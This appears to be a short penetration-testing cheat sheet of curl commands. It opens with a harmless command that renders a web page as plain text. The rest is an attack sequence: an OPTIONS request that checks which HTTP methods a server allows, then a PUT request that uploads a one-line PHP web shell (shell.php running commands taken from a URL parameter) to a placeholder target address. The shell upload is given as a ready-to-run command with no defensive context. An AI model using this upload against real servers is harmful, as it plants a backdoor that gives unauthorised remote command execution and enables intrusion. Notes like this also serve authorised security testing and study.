# CURL

Look at page with just text
```
curl $target -s -L | html2text -width '99' | uniq
```

curl -v -X OPTIONS http://INSERTIPADDRESS/
curl -v -X PUT -d '<?php system($_GET["cmd"]); ?>' http://INSERTIPADDRESS/test/shell.php
